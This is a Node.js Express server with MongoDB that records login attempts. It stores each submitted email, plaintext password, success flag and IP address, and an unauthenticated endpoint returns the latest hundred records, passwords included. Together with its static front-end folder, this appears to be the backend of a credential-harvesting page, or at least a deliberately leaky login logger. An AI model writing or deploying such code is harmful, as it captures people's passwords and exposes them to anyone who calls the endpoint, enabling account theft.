const express = require("express");
const mongoose = require("mongoose");
const path = require("path");

const LoginAttempt = require("./models/LoginAttempt");

const app = express();
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/northline";

let isConnected = false;

async function connectDB() {
  if (!isConnected) {
    await mongoose.connect(MONGO_URI);
    isConnected = true;
  }
}

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

app.use(async (req, res, next) => {
  try {
    await connectDB();
    next();
  } catch (err) {
    res.status(500).json({ error: "Database connection failed" });
  }
});

app.post("/api/login-attempt", async (req, res) => {
  try {
    const { email, password, success } = req.body;
    const attempt = await LoginAttempt.create({
      email,
      password,
      success,
      ip_address: req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown",
    });
    res.json({ ok: true, id: attempt._id });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

app.get("/api/login-attempts", async (req, res) => {
  try {
    const attempts = await LoginAttempt.find().sort({ attempted_at: -1 }).limit(100);
    res.json(attempts);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

if (process.env.VERCEL) {
  module.exports = app;
} else {
  const PORT = process.env.PORT || 3000;
  connectDB().then(() => {
    console.log("MongoDB connecte");
    app.listen(PORT, () => console.log(`Serveur sur http://localhost:${PORT}`));
  });
}
